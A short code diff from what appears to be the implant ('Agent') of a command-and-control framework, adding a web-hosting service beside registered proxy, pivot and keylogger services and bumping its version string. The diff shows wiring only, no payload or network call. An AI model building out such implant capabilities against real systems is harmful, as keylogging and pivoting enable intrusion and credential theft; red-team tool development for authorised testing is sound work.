@@ -54,6 +54,7 @@ namespace Agent
             ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
             ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
             ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
+            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
 
 
             var commModule = CommunicationFactory.CreateCommunicator(connexion);
@@ -92,7 +93,7 @@ namespace Agent
                 Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "Net v6.0",
+                Version = "Net v7.0",
             };
 
             return metadata;
